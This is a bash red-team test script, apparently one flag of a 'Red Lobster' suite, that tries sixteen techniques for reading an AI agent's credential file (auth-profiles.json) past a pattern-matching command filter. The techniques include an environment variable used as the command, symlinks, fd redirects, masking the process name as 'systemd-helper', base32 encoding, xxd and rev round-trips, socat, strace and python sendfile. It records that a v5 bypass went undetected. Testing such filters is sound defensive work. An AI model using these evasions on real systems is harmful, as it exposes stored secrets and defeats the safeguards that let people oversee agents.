#!/usr/bin/env bash
# Red Lobster v6 — Flag 9: STEALTH — Pattern matching evasion
# v5 gap: env var as command was undetected
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/redlobster-lib.sh"

rl_init_flag "flag9" "Flag 9: STEALTH — Pattern matching evasion (v6)"

TARGET="/home/openclaw/.openclaw/agents/main/agent/auth-profiles.json"
OUTDIR="$FLAG_DIR"

# 1. env var as command (v5 bypass)
rl_run "env var as command" \
  "CMD=cat; \$CMD '$TARGET' > '$OUTDIR/9_1.txt'"

# 2. symlink indirection
rl_run "symlink + cat" \
  "ln -sf '$TARGET' '$OUTDIR/link9_2' && cat '$OUTDIR/link9_2' > '$OUTDIR/9_2.txt'; rm -f '$OUTDIR/link9_2'"

# 3. fd redirect
rl_run "fd redirect (exec 3<)" \
  "exec 3< '$TARGET'; cat <&3 > '$OUTDIR/9_3.txt'; exec 3<&-"

# 4. exec -a process masking
rl_run "exec -a masking" \
  "bash -c 'exec -a systemd-helper bash -c \"cat $TARGET > $OUTDIR/9_4.txt\"'"

# 5. base32 encoding (not base64)
rl_run "base32 encoding pipeline" \
  "cat '$TARGET' | gzip | base32 > '$OUTDIR/9_5.txt'"

# 6. tac (reverse cat)
rl_run "tac (reverse cat)" \
  "tac '$TARGET' > '$OUTDIR/9_6.txt'"

# 7. rev + rev (double reverse)
rl_run "rev + rev roundtrip" \
  "rev '$TARGET' | rev > '$OUTDIR/9_7.txt'"

# 8. head + tail combination
rl_run "head + tail combination" \
  "head -n 1000 '$TARGET' > '$OUTDIR/9_8.txt'; tail -n 1000 '$TARGET' >> '$OUTDIR/9_8.txt'"

# 9. while read line loop
rl_run "while read line loop" \
  "while IFS= read -r line; do echo \"\$line\"; done < '$TARGET' > '$OUTDIR/9_9.txt'"

# 10. paste command
rl_run "paste command" \
  "paste '$TARGET' > '$OUTDIR/9_10.txt'"

# 11. install command (copies file)
rl_run "install -m 644 copy" \
  "install -m 644 '$TARGET' '$OUTDIR/9_11.txt'"

# 12. find -exec cat
rl_run "find -exec cat" \
  "find '$TARGET' -exec cat {} \\; > '$OUTDIR/9_12.txt' 2>/dev/null"

# 13. xxd + xxd -r roundtrip
rl_run "xxd + xxd -r roundtrip" \
  "xxd '$TARGET' | xxd -r > '$OUTDIR/9_13.txt'"

# 14. socat file read
rl_run "socat file read" \
  "socat -u FILE:'$TARGET' OPEN:'$OUTDIR/9_14.txt',creat 2>/dev/null"

# 15. strace-based read
rl_run "strace -e read cat" \
  "strace -e trace=read cat '$TARGET' > '$OUTDIR/9_15.txt' 2>/dev/null"

# 16. sendfile via python (zero-copy)
rl_run "python3 os.sendfile" \
  "python3 -c \"
import os
src = os.open('$TARGET', os.O_RDONLY)
dst = os.open('$OUTDIR/9_16.txt', os.O_WRONLY|os.O_CREAT, 0o644)
os.sendfile(dst, src, 0, os.fstat(src).st_size)
os.close(src); os.close(dst)
\""

rl_summary
rl_cleanup
